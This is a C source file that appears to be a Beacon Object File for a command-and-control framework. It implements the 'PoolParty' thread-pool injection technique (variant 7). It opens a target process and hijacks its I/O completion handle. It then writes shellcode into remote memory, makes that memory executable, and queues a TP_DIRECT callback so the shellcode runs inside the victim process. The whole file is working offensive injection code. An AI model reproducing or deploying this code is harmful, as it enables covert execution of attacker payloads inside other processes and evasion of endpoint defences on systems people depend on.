#include "PoolParty.h"

void RemoteTpDirectInsertionSetupExecution(HANDLE hTarget, LPVOID pShellcodeAddress) {
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
    _ZwSetIoCompletion ZwSetIoCompletion = (_ZwSetIoCompletion)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwSetIoCompletion"));
    
    TP_DIRECT Direct = { 0 };
    Direct.Callback = pShellcodeAddress;

    PTP_DIRECT RemoteDirectAddress = (PTP_DIRECT)(KERNEL32$VirtualAllocEx(hTarget, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    NTSTATUS res = NtWriteVirtualMemory(hTarget, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT), NULL);

    ZwSetIoCompletion(hIoCompletion, RemoteDirectAddress, 0, 0, 0);
}


void Inject7(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
    
    HANDLE hTarget = NULL;
    DWORD dwOldProtect = NULL;

    hTarget = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwTargetProcessId);
    if (hTarget) {
        HijackIoCompletionHandle(hTarget, IO_COMPLETION_ALL_ACCESS);
        
        PVOID pShellcodeAddress = KERNEL32$VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        NtWriteVirtualMemory(hTarget, pShellcodeAddress, shellcode, shellcodeSize, NULL);
        KERNEL32$VirtualProtectEx(hTarget, pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
        
        RemoteTpDirectInsertionSetupExecution(hTarget, pShellcodeAddress);
    } else { 
            BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
        }
}
